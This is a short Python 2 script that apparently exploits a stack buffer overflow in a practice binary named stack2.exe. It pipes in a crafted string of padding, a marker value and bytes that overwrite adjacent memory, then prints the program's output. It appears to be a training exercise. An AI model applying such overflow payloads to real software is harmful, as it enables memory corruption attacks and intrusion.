import os

StdIn,StdOut = os.popen4(r".\stack2.exe")

XploitString = "x" * 68 + "tsrq" + "x" * 4 + "\x94\x93\x92\x91" + '\n'
print XploitString

StdIn.write(XploitString)
StdIn.close()

print StdOut.read()
